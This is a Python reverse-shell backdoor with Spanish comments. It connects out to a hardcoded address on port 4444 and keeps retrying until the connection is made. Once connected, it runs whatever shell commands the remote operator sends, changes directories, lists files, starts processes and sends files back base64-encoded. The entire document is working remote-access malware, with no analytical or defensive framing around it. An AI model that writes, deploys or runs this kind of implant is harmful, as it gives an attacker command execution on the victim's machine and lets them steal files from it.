import socket
import subprocess
import os
import platform
import getpass
import time
import base64
from time import sleep
 
r = "192.168.0.70" #Cambia Esto!
p = 4444 #Cambia esto!

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def c():
    while True:
        try:
            sock.connect((r, 4444))  
            break
             

        except:
            time.sleep(2)

def shell():
    while True:
        try:
            sock.connect((r, 4444))
        except:
            pass
        cmd = sock.recv(1024).decode("utf-8")

        # Termina la Conexion
        if cmd.startswith("exit"):
            sock.send("[+] Secure Exit Actioned, ByeBye :)".encode())
            sock.close()
            print("Socket cerrado. Esperando 3 segundos antes de intentar reconectar...")
            time.sleep(3)
            c()
            break

        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Directorio Cambiado".encode())

        elif cmd[:5] == "start":
            try:
                subprocess.Popen(cmd[6:], shell=True)
                sock.send(f"[+] {cmd[6:]} Started Correctly")
            except:
                sock.send(f"[-] {cmd[6:]} Could not be started!")

        elif cmd == "dir" or cmd == "ls":
            sock.send(str(os.listdir(".")).encode())

        elif cmd[:8] == "download":
            with open(cmd[9:],'rb') as file_d:
                sock.send(base64.b64encode(file_d.read()))

        else:
            comm = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = comm.stdout.read() + comm.stderr.read()
            sock.send(result)

        try:
            sock.connect((r, 4444))
        except:
            pass

if __name__ == '__main__':
    while True:
        c()
        shell() 
